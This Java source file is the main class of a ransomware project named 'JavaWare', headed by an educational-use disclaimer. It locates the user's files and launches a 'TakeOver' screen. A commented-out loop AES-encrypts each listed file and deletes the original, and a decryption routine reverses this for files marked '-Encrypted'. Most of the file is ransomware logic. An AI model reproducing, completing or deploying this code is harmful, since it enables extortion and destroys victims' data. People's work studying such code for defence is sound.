/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
  _ _/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 18/07/19
 Version 1.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/

package RansomeWare;

import javafx.application.Application;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;

public class JavaWare {

    AES aes;

    public JavaWare() {
        aes = new AES();
    }

    public void EncryptFiles() throws Exception{
        FindFiles ff = new FindFiles();
        long startTime = System.nanoTime();
        ff.FindFiles();
        long endTime = System.nanoTime();

        System.out.println("Time: " + (endTime - startTime));
        System.out.println(ff.count);


        /*
        BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "output.txt"));
        String line = reader.readLine();
        while(line != null) {
            //System.out.println(line);
            File file = new File(line);
            aes.encrypt(file);
            file.delete();
            //read next line
            line = reader.readLine();
        }
        reader.close();*/
        Application.launch(TakeOver.class, "JavaWare");
    }

    public void DecryptFiles() throws Exception {
        String home = System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "Documents";
        decryptionTraversal(home);
    }

    public void decryptionTraversal(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;

        for(File f: list) {
            if(f.isDirectory()) {
                if (f.getName().equals("Windows") || f.getName().equals("Library")) return; //system still works
                decryptionTraversal(f.getAbsolutePath());
            } else {
                String filename = f.getName();
                if(filename.contains("-Encrypted")) {
                    aes.decrypt(f);
                    f.delete();
                }
            }
        }
    }



    public static void main(String[] args) throws Exception {
        JavaWare jw = new JavaWare();
        jw.EncryptFiles();

    }
}
